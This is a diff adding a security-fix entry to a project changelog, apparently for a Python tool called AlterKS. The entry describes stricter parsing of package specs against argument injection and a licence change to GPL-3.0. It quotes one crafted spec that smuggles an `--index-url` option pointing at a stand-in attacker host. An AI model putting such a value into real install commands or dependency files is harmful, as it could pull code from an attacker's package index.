@@ -280,6 +280,11 @@ src/alterks/
 
 ## Changelog
 
+### v0.1.11 — Security Fix
+
+- **Fixed**: `_parse_spec` argument injection in version string (OWASP A03:2021 — Injection). Replaced manual string splitting with `packaging.requirements.Requirement` for rigorous PEP 508 parsing. Parsed name and version are validated against strict regexes. Crafted specs like `pkg==1.0 --index-url=https://evil.com` are now rejected.
+- **Changed**: License from MIT to **GNU General Public License v3 (GPL-3.0-only)**.
+
 ### v0.1.10 — Security Fix
 
 - **Fixed**: Sensitive data sent to unverified webhook (OWASP A02:2021 — Cryptographic Failures). Webhook payloads are now signed with HMAC-SHA256 when a `webhook_secret` is configured (via config file or `--webhook-secret` CLI flag). The `X-AlterKS-Signature` header is included with each POST. Warnings are logged when sending over plain HTTP or without a secret.
